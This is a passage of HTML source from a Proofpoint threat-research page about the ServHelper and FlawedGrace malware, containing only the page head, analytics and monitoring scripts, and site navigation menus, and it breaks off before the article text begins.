


<!DOCTYPE html>
<html lang="en" dir="ltr" prefix="content: http://purl.org/rss/1.0/modules/content/  dc: http://purl.org/dc/terms/  foaf: http://xmlns.com/foaf/0.1/  og: http://ogp.me/ns#  rdfs: http://www.w3.org/2000/01/rdf-schema#  schema: http://schema.org/  sioc: http://rdfs.org/sioc/ns#  sioct: http://rdfs.org/sioc/types#  skos: http://www.w3.org/2004/02/skos/core#  xsd: http://www.w3.org/2001/XMLSchema# " class="page-en">
  <head>
    <style>.async-hide { opacity: 0 !important} </style>
<script>(function(a,s,y,n,c,h,i,d,e){s.className+=' '+y;h.start=1*new Date;
                  h.end=i=function(){s.className=s.className.replace(RegExp(' ?'+y),'')};
                  (a[n]=a[n]||[]).hide=h;setTimeout(function(){i();h.end=null},c);h.timeout=c;
                  })(window,document.documentElement,'async-hide','dataLayer',4000,
                  {'GTM-MGR7P8X':true});</script>
<script src="https://www.googleoptimize.com/optimize.js?id=GTM-KKGL4NZ"></script>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-MGR7P8X');</script>
<meta charset="utf-8" /><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={licenseKey:"0ae22ad83e",applicationID:"573869349"};window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var i=t[n]={exports:{}};e[n][0].call(i.exports,function(t){var i=e[n][1][t];return r(i||t)},i,i.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var i=0;i<n.length;i++)r(n[i]);return r}({1:[function(e,t,n){function r(){}function i(e,t,n){return function(){return o(e,[u.now()].concat(c(arguments)),t?null:this,n),t?void 0:this}}var o=e("handle"),a=e(7),c=e(8),f=e("ee").get("tracer"),u=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],p="api-",l=p+"ixn-";a(d,function(e,t){s[t]=i(p+t,!0,"api")}),s.addPageAction=i(p+"addPageAction",!0),s.setCurrentRouteName=i(p+"routeName",!0),t.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,t){var n={},r=this,i="function"==typeof t;return o(l+"tracer",[u.now(),e,n],r),function(){if(f.emit((i?"":"no-")+"fn-start",[u.now(),r,i],n),i)try{return t.apply(this,arguments)}catch(e){throw f.emit("fn-err",[arguments,this,e],n),e}finally{f.emit("fn-end",[u.now()],n)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,t){m[t]=i(l+t)}),newrelic.noticeError=function(e,t){"string"==typeof e&&(e=new Error(e)),o("err",[e,u.now(),!1,t])}},{}],2:[function(e,t,n){function r(){return c.exists&&performance.now?Math.round(performance.now()):(o=Math.max((new Date).getTime(),o))-a}function i(){return o}var o=(new Date).getTime(),a=o,c=e(9);t.exports=r,t.exports.offset=a,t.exports.getLastTimestamp=i},{}],3:[function(e,t,n){function r(e){return!(!e||!e.protocol||"file:"===e.protocol)}t.exports=r},{}],4:[function(e,t,n){function r(e,t){var n=e.getEntries();n.forEach(function(e){"first-paint"===e.name?d("timing",["fp",Math.floor(e.startTime)]):"first-contentful-paint"===e.name&&d("timing",["fcp",Math.floor(e.startTime)])})}function i(e,t){var n=e.getEntries();n.length>0&&d("lcp",[n[n.length-1]])}function o(e){e.getEntries().forEach(function(e){e.hadRecentInput||d("cls",[e])})}function a(e){if(e instanceof m&&!g){var t=Math.round(e.timeStamp),n={type:e.type};t<=p.now()?n.fid=p.now()-t:t>p.offset&&t<=Date.now()?(t-=p.offset,n.fid=p.now()-t):t=p.now(),g=!0,d("timing",["fi",t,n])}}function c(e){d("pageHide",[p.now(),e])}if(!("init"in NREUM&&"page_view_timing"in NREUM.init&&"enabled"in NREUM.init.page_view_timing&&NREUM.init.page_view_timing.enabled===!1)){var f,u,s,d=e("handle"),p=e("loader"),l=e(6),m=NREUM.o.EV;if("PerformanceObserver"in window&&"function"==typeof window.PerformanceObserver){f=new PerformanceObserver(r);try{f.observe({entryTypes:["paint"]})}catch(v){}u=new PerformanceObserver(i);try{u.observe({entryTypes:["largest-contentful-paint"]})}catch(v){}s=new PerformanceObserver(o);try{s.observe({type:"layout-shift",buffered:!0})}catch(v){}}if("addEventListener"in document){var g=!1,w=["click","keydown","mousedown","pointerdown","touchstart"];w.forEach(function(e){document.addEventListener(e,a,!1)})}l(c)}},{}],5:[function(e,t,n){function r(e,t){if(!i)return!1;if(e!==i)return!1;if(!t)return!0;if(!o)return!1;for(var n=o.split("."),r=t.split("."),a=0;a<r.length;a++)if(r[a]!==n[a])return!1;return!0}var i=null,o=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var c=navigator.userAgent,f=c.match(a);f&&c.indexOf("Chrome")===-1&&c.indexOf("Chromium")===-1&&(i="Safari",o=f[1])}t.exports={agent:i,version:o,match:r}},{}],6:[function(e,t,n){function r(e){function t(){e(a&&document[a]?document[a]:document[i]?"hidden":"visible")}"addEventListener"in document&&o&&document.addEventListener(o,t,!1)}t.exports=r;var i,o,a;"undefined"!=typeof document.hidden?(i="hidden",o="visibilitychange",a="visibilityState"):"undefined"!=typeof document.msHidden?(i="msHidden",o="msvisibilitychange"):"undefined"!=typeof document.webkitHidden&&(i="webkitHidden",o="webkitvisibilitychange",a="webkitVisibilityState")},{}],7:[function(e,t,n){function r(e,t){var n=[],r="",o=0;for(r in e)i.call(e,r)&&(n[o]=t(r,e[r]),o+=1);return n}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],8:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,i=n-t||0,o=Array(i<0?0:i);++r<i;)o[r]=e[t+r];return o}t.exports=r},{}],9:[function(e,t,n){t.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,t,n){function r(){}function i(e){function t(e){return e&&e instanceof r?e:e?u(e,f,a):a()}function n(n,r,i,o,a){if(a!==!1&&(a=!0),!l.aborted||o){e&&a&&e(n,r,i);for(var c=t(i),f=v(n),u=f.length,s=0;s<u;s++)f[s].apply(c,r);var p=d[h[n]];return p&&p.push([b,n,r,c]),c}}function o(e,t){y[e]=v(e).concat(t)}function m(e,t){var n=y[e];if(n)for(var r=0;r<n.length;r++)n[r]===t&&n.splice(r,1)}function v(e){return y[e]||[]}function g(e){return p[e]=p[e]||i(n)}function w(e,t){s(e,function(e,n){t=t||"feature",h[n]=t,t in d||(d[t]=[])})}var y={},h={},b={on:o,addEventListener:o,removeEventListener:m,emit:n,get:g,listeners:v,context:t,buffer:w,abort:c,aborted:!1};return b}function o(e){return u(e,f,a)}function a(){return new r}function c(){(d.api||d.feature)&&(l.aborted=!0,d=l.backlog={})}var f="nr@context",u=e("gos"),s=e(7),d={},p={},l=t.exports=i();t.exports.getOrSetContext=o,l.backlog=d},{}],gos:[function(e,t,n){function r(e,t,n){if(i.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(o){}return e[t]=r,r}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){i.buffer([e],r),i.emit(e,t,n)}var i=e("ee").get("handle");t.exports=r,r.ee=i},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,o,function(){return i++})}var i=1,o="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!E++){var e=x.info=NREUM.info,t=l.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&t))return u.abort();f(h,function(t,n){e[t]||(e[t]=n)});var n=a();c("mark",["onload",n+x.offset],null,"api"),c("timing",["load",n]);var r=l.createElement("script");r.src="https://"+e.agent,t.parentNode.insertBefore(r,t)}}function i(){"complete"===l.readyState&&o()}function o(){c("mark",["domContent",a()+x.offset],null,"api")}var a=e(2),c=e("handle"),f=e(7),u=e("ee"),s=e(5),d=e(3),p=window,l=p.document,m="addEventListener",v="attachEvent",g=p.XMLHttpRequest,w=g&&g.prototype;if(d(p.location)){NREUM.o={ST:setTimeout,SI:p.setImmediate,CT:clearTimeout,XHR:g,REQ:p.Request,EV:p.Event,PR:p.Promise,MO:p.MutationObserver};var y=""+location,h={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1208.min.js"},b=g&&w&&w[m]&&!/CriOS/.test(navigator.userAgent),x=t.exports={offset:a.getLastTimestamp(),now:a,origin:y,features:{},xhrWrappable:b,userAgent:s};e(1),e(4),l[m]?(l[m]("DOMContentLoaded",o,!1),p[m]("load",r,!1)):(l[v]("onreadystatechange",i),p[v]("onload",r)),c("mark",["firstbyte",a.getLastTimestamp()],null,"api");var E=0}},{}],"wrap-function":[function(e,t,n){function r(e,t){function n(t,n,r,f,u){function nrWrapper(){var o,a,s,p;try{a=this,o=d(arguments),s="function"==typeof r?r(o,a):r||{}}catch(l){i([l,"",[o,a,f],s],e)}c(n+"start",[o,a,f],s,u);try{return p=t.apply(a,o)}catch(m){throw c(n+"err",[o,a,m],s,u),m}finally{c(n+"end",[o,a,p],s,u)}}return a(t)?t:(n||(n=""),nrWrapper[p]=t,o(t,nrWrapper,e),nrWrapper)}function r(e,t,r,i,o){r||(r="");var c,f,u,s="-"===r.charAt(0);for(u=0;u<t.length;u++)f=t[u],c=e[f],a(c)||(e[f]=n(c,s?f+r:r,i,f,o))}function c(n,r,o,a){if(!m||t){var c=m;m=!0;try{e.emit(n,r,o,t,a)}catch(f){i([f,n,r,o],e)}m=c}}return e||(e=s),n.inPlace=r,n.flag=p,n}function i(e,t){t||(t=s);try{t.emit("internal-error",e)}catch(n){}}function o(e,t,n){if(Object.defineProperty&&Object.keys)try{var r=Object.keys(e);return r.forEach(function(n){Object.defineProperty(t,n,{get:function(){return e[n]},set:function(t){return e[n]=t,t}})}),t}catch(o){i([o],n)}for(var a in e)l.call(e,a)&&(t[a]=e[a]);return t}function a(e){return!(e&&e instanceof Function&&e.apply&&!e[p])}function c(e,t){var n=t(e);return n[p]=e,o(e,n,s),n}function f(e,t,n){var r=e[t];e[t]=c(r,n)}function u(){for(var e=arguments.length,t=new Array(e),n=0;n<e;++n)t[n]=arguments[n];return t}var s=e("ee"),d=e(8),p="nr@original",l=Object.prototype.hasOwnProperty,m=!1;t.exports=r,t.exports.wrapFunction=c,t.exports.wrapInPlace=f,t.exports.argsToArray=u},{}]},{},["loader"]);</script>
<link rel="shortcut icon" href="/themes/custom/proofpoint/apps/drupal/favicon.ico" />
<link rel="canonical" href="https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="og:site_name" content="Proofpoint" />
<link rel="shortlink" href="https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" />
<meta name="description" content="Proofpoint researchers detail two undocumented pieces of malware being used by TA505." />
<meta property="og:type" content="website" />
<meta name="twitter:site" content="@proofpoint" />
<meta name="twitter:description" content="Proofpoint researchers detail two undocumented pieces of malware being used by TA505." />
<link rel="mask-icon" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon.svg" />
<meta name="twitter:title" content="ServHelper and FlawedGrace - New malware introduced by TA505 | Proofpoint" />
<link rel="icon" sizes="16x16" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-16x16.png" />
<meta property="og:url" content="https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" />
<link rel="image_src" href="https://www.proofpoint.com/sites/default/files/styles/metatag/public/images/Blog/server2.png?itok=t3kv1PkU" />
<link rel="icon" sizes="32x32" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-32x32.png" />
<meta property="og:title" content="ServHelper and FlawedGrace - New malware introduced by TA505 | Proofpoint" />
<link rel="icon" sizes="96x96" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-96x96.png" />
<meta name="twitter:url" content="https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" />
<link rel="icon" sizes="192x192" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-192x192.png" />
<meta property="og:description" content="Proofpoint researchers detail two undocumented pieces of malware being used by TA505." />
<meta name="twitter:image" content="https://www.proofpoint.com/sites/default/files/styles/metatag/public/images/Blog/server2.png?itok=t3kv1PkU" />
<link rel="apple-touch-icon" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-60x60.png" />
<link rel="apple-touch-icon" sizes="72x72" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-72x72.png" />
<meta property="og:image" content="https://www.proofpoint.com/sites/default/files/styles/metatag/public/images/Blog/server2.png?itok=t3kv1PkU" />
<link rel="apple-touch-icon" sizes="76x76" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-76x76.png" />
<meta property="og:image:url" content="https://www.proofpoint.com/sites/default/files/styles/metatag/public/images/Blog/server2.png?itok=t3kv1PkU" />
<link rel="apple-touch-icon" sizes="114x114" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-114x114.png" />
<link rel="apple-touch-icon" sizes="120x120" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-120x120.png" />
<meta property="og:image:secure_url" content="https://www.proofpoint.com/sites/default/files/styles/metatag/public/images/Blog/server2.png?itok=t3kv1PkU" />
<link rel="apple-touch-icon" sizes="144x144" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-144x144.png" />
<link rel="apple-touch-icon" sizes="152x152" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-152x152.png" />
<link rel="apple-touch-icon" sizes="180x180" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-180x180.png" />
<link rel="apple-touch-icon-precomposed" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-57x57.png" />
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-72x72.png" />
<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-76x76.png" />
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-114x114.png" />
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-120x120.png" />
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-144x144.png" />
<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-152x152.png" />
<link rel="apple-touch-icon-precomposed" sizes="180x180" href="/themes/custom/proofpoint/apps/drupal/images/favicons/favicon-180x180.png" />
<meta property="article:published_time" content="2019-01-09T09:25:30-08:00" />
<meta property="article:modified_time" content="2019-02-01T08:27:59-08:00" />
<meta name="facebook-domain-verification" content="l349mr2tyecyl7w3a1146378lqxru1" />
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
<meta name="MobileOptimized" content="width" />
<meta name="HandheldFriendly" content="true" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/proofpoint.woff2" as="font" crossorigin="anonymous" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/RobotoCondensed-Regular-webfont.woff" as="font" crossorigin="anonymous" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/fjalla-one-v7-latin-regular.woff" as="font" crossorigin="anonymous" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/fjalla-one-v7-latin-regular.woff2" as="font" crossorigin="anonymous" />
<link rel="preload" href="/themes/custom/proofpoint/dist/app-drupal/assets/fonts/RobotoCondensed-Bold-webfont.woff" as="font" crossorigin="anonymous" />
<link rel="alternate" hreflang="en-us" href="https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" />

    <title>ServHelper and FlawedGrace - New malware introduced by TA505 | Proofpoint</title>
    <link rel="stylesheet" media="all" href="/sites/default/files/css/css_9u0o5eJuu6TGwZMprqQy-6DGTA-fv7Mh1BBQctJUE2M.css" />
<link rel="stylesheet" media="all" href="/sites/default/files/css/css_BxKv41qBzxtDrBVW-nvhiUygTk7Jh6IK_IE0xKJPE_U.css" />

    
<!--[if lte IE 8]>
<script src="/sites/default/files/js/js_VtafjXmRvoUgAzqzYTA3Wrjkx9wcWhjP0G4ZnnqRamA.js"></script>
<![endif]-->
<script src="/modules/custom/pp_theme/js/modernizr.min.js?v=3.3.1"></script>

  </head>
  <body class="path-node">
        <a href="#main-content" class="visually-hidden focusable">
      Skip to main content
    </a>
    
      <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas>
    


<header class="header">

    <div class="super-nav">
  <div class="super-nav__wrapper">
    <div class="super-nav__top">
      <a href="/" class="super-nav__logo"><img src="/themes/custom/proofpoint/dist/app-drupal/assets/logo-reg.svg" alt="proofpoint"></a>
      <div class="super-nav__top-links">
        <a href="#" data-mega-target="products">Products</a>
        <a href="#" data-mega-target="solutions">Solutions</a>
        <a href="#" data-mega-target="partners">Partners</a>
        <a href="#" data-mega-target="resources">Resources</a>
        <a href="#" data-mega-target="company">Company</a>
      </div>
      <div class="super-nav__top-extras">
        <div class="super-nav__search">
          <div class="super-nav__search-icon"></div>
          <form action="/us" data-region="us" data-language="en">
            <input type="text" name="search_block_form" placeholder="Search">
            <input type="submit">
          </form>
        </div>
        <div class="super-nav__regions">
          <div class="super-nav__region-links">
            <a href="/us">United States</a>
            <a href="/uk">United Kingdom</a>
            <a href="/fr">France</a>
            <a href="/de">Germany</a>
            <a href="/it">Italy</a>
            <a href="/es">Spain</a>
            <a href="/jp">Japan</a>
            <a href="/au">Australia</a>
          </div>
        </div>
        <div class="super-nav__logins">
          <a href="#">Login</a>
          <div class="super-nav__login-links">
            <a href="https://proofpointcommunities.force.com/community/s/" target="_blank">Support Log-in</a>
            <a href="https://suite.nexgate.com/users/sign_in" target="_blank">Digital Risk Portal</a>
            <a href="https://emaildefense.proofpoint.com/login.php" target="_blank">Email Fraud Defense</a>
            <a href="https://threatintel.proofpoint.com/" target="_blank">ET Intelligence</a>
            <a href="https://us1.proofpointessentials.com/app/login.php" target="_blank">Proofpoint Essentials</a>
            <a href="https://proofpointcommunities.force.com/community" target="_blank">Sendmail Support Log-in</a>
          </div>
        </div>
        <a href="/us/contact" class="super-nav__contact">Contact</a>
      </div>
    </div>

    <!--Products-->
    <div class="super-nav__mega" data-mega-source="products" data-sections="3">
      <div class="super-nav__mega-section">
        <div class="super-nav__main-links">
          <a href="/us/products/email-security-and-protection" data-sublink-target="email"><h6>Email Security and Protection</h6><p>Defend against threats, ensure business continuity, and implement email policies.</p></a>
          <a href="/us/products/advanced-threat-protection" data-sublink-target="threat"><h6>Advanced Threat Protection</h6><p>Protect against email, mobile, social and desktop threats.</p></a>
          <a href="/us/products/security-awareness-training" data-sublink-target="awareness"><h6>Security Awareness Training</h6><p>Engage your users and turn them into a strong line of defense against phishing and other cyber attacks.</p></a>
          <a href="/us/products/cloud-security" data-sublink-target="cloud"><h6>Cloud Security</h6><p>Defend against cyber criminals accessing your sensitive data and trusted accounts.</p></a>
          <a href="/us/products/archiving-and-compliance" data-sublink-target="archiving"><h6>Compliance and Archiving</h6><p>Reduce risk, control costs and improve data visibility to ensure compliance.</p></a>
          <a href="/us/products/information-protection" data-sublink-target="info"><h6>Information Protection</h6><p>Protect from data loss by negligent, compromised, and malicious users.</p></a>
          <a href="/us/products/digital-risk-protection" data-sublink-target="risk"><h6>Digital Risk Protection</h6><p>Protect against digital security risks across web domains, social media and the deep and dark web.</p></a>
          <a href="/us/products/premium-security-services" data-sublink-target="premium"><h6>Premium Security Services</h6><p>Get deeper insight with on-call, personalized assistance from our expert team.</p></a>
        </div>
      </div>

      <div class="super-nav__mega-section">
        <div class="super-nav__sub-links" data-sublink-source="email">
          <a href="/us/products/email-security-and-protection/email-protection">Email Protection</a>
          <a href="/us/products/email-protection/email-fraud-defense">Email Fraud Defense</a>
          <a href="/us/products/email-protection/threat-response-auto-pull">Threat Response Auto-Pull</a>
          <a href="/us/products/open-source-email-solution">Sendmail Open Source</a>
          <a href="/us/products/email-protection/essentials">Essentials for Small Business</a>
        </div>
        <div class="super-nav__sub-links" data-sublink-source="threat">
          <a href="/us/products/advanced-threat-protection/ransomware-and-targeted-attack-protection">Targeted Attack Protection in Email</a>
          <a href="/us/products/advanced-threat-protection/browser-isolation">Browser Isolation</a>
          <a href="/us/products/advanced-threat-protection/email-isolation">Email Isolation</a>
          <a href="/us/products/advanced-threat-protection/threat-response">Threat Response</a>
          <a href="/us/products/et-intelligence">Emerging Threats Intelligence</a>
        </div>
        <div class="super-nav__sub-links" data-sublink-source="awareness">
          <a href="/us/products/phishing-simulations-knowledge-assessments">Simulated Phishing and Knowledge Assessments</a>
          <a href="/us/products/security-awareness-training-videos-materials">Training Modules, Videos and Materials</a>
          <a href="/us/products/phishalarm-email-reporting-analysis">Phishing Email Reporting and Analysis</a>
          <a href="/us/products/security-awareness-reporting">Business Intelligence</a>
        </div>
        <div class="super-nav__sub-links" data-sublink-source="cloud">
          <a href="/us/products/cloud-security/cloud-account-defense">Cloud Account Defense</a>
          <a href="/us/products/cloud-security/cloud-app-security-broker">Cloud App Security Broker</a>
          <a href="/us/products/cloud-security/meta">Proofpoint Meta</a>
        </div>
        <div class="super-nav__sub-links" data-sublink-source="archiving">
          <span class="super-nav__sub-links-heading">Capture & Monitor</span>
          <div class="super-nav__tertiary-links">
            <a href="/us/products/archiving-and-compliance/content-capture">Content Capture</a>
            <a href="/us/products/archiving-and-compliance/content-patrol">Content Patrol</a>
            <a href="/us/products/archiving-and-compliance/compliance-gateway">Compliance Gateway</a>
          </div>
          <span class="super-nav__sub-links-heading">Archiving</span>
          <div class="super-nav__tertiary-links">
            <a href="/us/products/archiving-and-compliance/enterprise-archive">Enterprise Archive</a>
            <a href="/us/products/archiving-and-compliance/intelligent-supervision">Intelligent Supervision</a>
            <a href="/us/products/archiving-and-compliance/ediscovery-analytics">E-discovery Analytics</a>
            <a href="/us/products/archiving-and-compliance/nexusai-compliance">NexusAI Compliance</a>
          </div>
        </div>
        <div class="super-nav__sub-links" data-sublink-source="info">
          <a href="/us/products/information-protection/endpoint-dlp">Endpoint Data Loss Prevention (DLP)</a>
          <a href="/us/products/information-protection/enterprise-dlp">Enterprise Data Loss Prevention (DLP)</a>
          <a href="/us/products/information-protection/email-dlp">Email Data Loss Prevention (DLP)</a>
          <a href="/us/products/information-protection/email-encryption">Email Encryption</a>
          <a href="/us/products/information-protection/data-discover">Data Discover</a>
          <a href="/us/products/information-protection/insider-threat-management">Insider Threat Management</a>
        </div>
        <div class="super-nav__sub-links" data-sublink-source="risk">
          <a href="/us/products/digital-risk-protection/social-media-protection">Social Media Protection</a>
          <a href="/us/products/digital-risk-protection/domain-fraud-monitoring">Domain Fraud Monitoring</a>
          <a href="/us/products/digital-risk-protection/executive-location-threat-monitoring">Executive and Location Threat Monitoring</a>
        </div>
        <div class="super-nav__sub-links" data-sublink-source="premium">
          <a href="/us/products/premium-security-services/technical-account-managers">Technical Account Managers</a>
          <a href="/us/products/premium-security-services/premium-threat-information-service">Premium Threat Information Service</a>
          <a href="/us/products/premium-security-services/managed-services-for-proofpoint-security-awareness-training">Managed Services for Security Awareness Training</a>
          <a href="/us/products/premium-security-services/people-centric-security-program">People-Centric Security Program</a>
          <a href="/us/products/premium-security-services/managed-email-security">Managed Email Security</a>
          <a href="/us/products/premium-security-services/insider-threat-management-services">Insider Threat Management Services</a>
          <a href="/us/products/premium-security-services/compliance-and-archiving-services">Compliance and Archiving Services</a>
          <a href="/us/products/premium-security-services/consultative-services">Consultative Services</a>
        </div>
      </div>

                            


    
<div class="super-nav__mega-section"     style="background: url('/themes/custom/proofpoint/dist/app-drupal/assets/blue-bg2.png'); background-position: center center; background-size: cover; background-repeat: no-repeat; "
  >
  <div class="super-nav__mega-content">
          <img src="/themes/custom/proofpoint/dist/app-drupal/assets/iMac.png" alt="Security Awareness Training Modules">
              <h2   style="color: white !important;"
>Request a Free Trial Today</h2>
              <p   style="color: white !important;"
>We’ll deploy our solutions for 30 days so you can experience our technology in action.</p>
              <a class="super-nav__button" href="/us/free-trial-request">Try Now</a>
      </div>
</div>
          </div>

    <!-- Solutions -->
    <div class="super-nav__mega" data-mega-source="solutions" data-sections="2">
      <div class="super-nav__mega-section">
        <h2>Solutions by Topic</h2>
        <div class="super-nav__section-columns">
          <div class="super-nav__main-links">
            <a href="/us/solutions/protect-against-phishing"><h6>Protect Against Phishing</h6><p>Protect your people against phishing attacks with a fully integrated solution.</p></a>
            <a href="/us/solutions/remote-working-and-business-continuity-solutions"><h6>Remote Working and Business Continuity</h6><p>Secure your remote users and the data and applications they use.</p></a>
            <a href="/us/solutions/microsoft-365-security-compliance"><h6>Microsoft 365</h6><p>Protect your people and data in Microsoft 365 with unmatched security and compliance tools.</p></a>
            <a href="/us/solutions/next-generation-compliance-solutions"><h6>Next Generation Compliance Solutions</h6><p>Safeguard business-critical information from data exfiltration, compliance risks and violations.</p></a>
            <a href="/us/solutions/bec-and-eac-protection"><h6>Business Email Compromise</h6><p>Block attacks with a layered solution that protects you against every type of email fraud threat.</p></a>
            <a href="/us/solutions/social-media-compliance"><h6>Social Media Compliance</h6><p>Simplify social media compliance with pre-built content categories, policies and reports.</p></a>
            <a href="/us/solutions/intel-mcafee-transition"><h6>Replace McAfee Email Security Products</h6><p>Stay ahead of email threats with email security from the exclusive migration partner of Intel Security.</p></a>
          </div>
          <div class="super-nav__main-links">
            <a href="/us/solutions/rethink-your-mimecast-email-security"><h6>Move from Mimecast Email Security</h6><p>Learn why organizations are moving to Proofpoint to protect their people and organization.</p></a>
            <a href="/us/solutions/upgrade-your-symantec-email-security-to-proofpoint"><h6>Upgrade Your Symantec Email Security</h6><p>Learn how upgrading to Proofpoint can help you keep pace with today's ever&#8209;evolving threat landscape.</p></a>
            <a href="/us/solutions/advanced-email-security"><h6>Advanced Email Security</h6><p>Block and resolve inbound threats across the entire email attack vector.</p></a>
            <a href="/us/solutions/protect-cloud-apps"><h6>Protect Cloud Apps</h6><p>Secure your investments in Microsoft 365, Google G Suite, and other cloud applications.</p></a>
            <a href="/us/solutions/full-people-centric-security"><h6> Full People-Centric Security</h6><p>Advance your strategy to solve even more of today's ever&#8209;evolving security challenges.</p></a>
            <a href="/us/solutions/bundles"><h6>Solution Bundles</h6><p>Stop advanced attacks and solve your most pressing security concerns with our solution bundles.</p></a>
            <a href="/us/solutions/nexusai"><h6>NexusAI</h6><p>Delivering protection, compliance and insights with data.</p></a>          
          </div>
        </div>

      </div>
      <div class="super-nav__mega-section">
        <h2>Solutions by Industry</h2>
        <div class="super-nav__secondary-links">
          <a href="/us/solutions/federal">Federal Government</a>
          <a href="/us/solutions/state-and-local-government">State and Local Government</a>
          <a href="/us/solutions/higher-education-security">Higher Education</a>
          <a href="/us/solutions/financial-services-and-insurance">Financial Services</a>
          <a href="/us/solutions/healthcare-information-security">Healthcare</a>
          <a href="/us/solutions/mobile-message-security-solutions-for-service-providers">Mobile Operators</a>
          <a href="/us/solutions/email-security-solutions-for-service-providers">Internet Service Providers</a>
          <a href="/us/solutions/protection-compliance-small-business">Small and Medium Businesses</a>
        </div>
      </div>
    </div>


    <!-- Partners -->
    <div class="super-nav__mega" data-mega-source="partners" data-sections="2">
      <div class="super-nav__mega-section">
        <h2>Partner Programs</h2>
        <div class="super-nav__section-columns">
          <div class="super-nav__main-links">
            <a href="https://partners.proofpoint.com"><h6>Channel Partners</h6><p>Become a channel partner. Deliver Proofpoint solutions to your customers and grow your business.</p></a>
            <a href="/us/partners/archive-extraction-partners"><h6>Archive Extraction Partners</h6><p>Learn about the benefits of becoming a Proofpoint Extraction Partner.</p></a>
            <a href="/us/global-system-integrator-gsi-and-global-managed-service-provider-msp-partners"><h6>Global System Integrator (GSI) and Managed Service Provider (MSP) Partners</h6><p>Learn about our global consulting and services partners that deliver fully managed and integrated solutions.</p></a>
          </div>
          <div class="super-nav__main-links">
            <a href="/us/partners/technology-alliance-partners"><h6>Technology and Alliance Partners</h6><p>Learn about our relationships with industry-leading firms to help protect your people, data and brand.</p></a>
            <a href="/us/partners/social-media-protection-partners"><h6>Social Media Protection Partners</h6><p>Learn about the technology and alliance partners in our Social Media Protection Partner program.</p></a>
          </div>
        </div>
      </div>
      <div class="super-nav__mega-section">
        <h2>Partner Tools</h2>
        <div class="super-nav__secondary-links">
          <a href="https://partners.proofpoint.com/prm/English/s/applicant" target="_blank">Become a Channel Partner</a>
          <a href="https://partners.proofpoint.com" target="_blank">Channel Partner Portal</a>
          <a id="channel-buzz" href="https://www.proofpoint.com/sites/default/files/pfpt-us-channel-buzz.pdf" target="_blank">Channel Buzz</a>
        </div>
      </div>
    </div>

	<style>
		#cpe-credits {
			color: #009ADA;
			font-size: 12px;
		}
		#cpe-credits:hover {
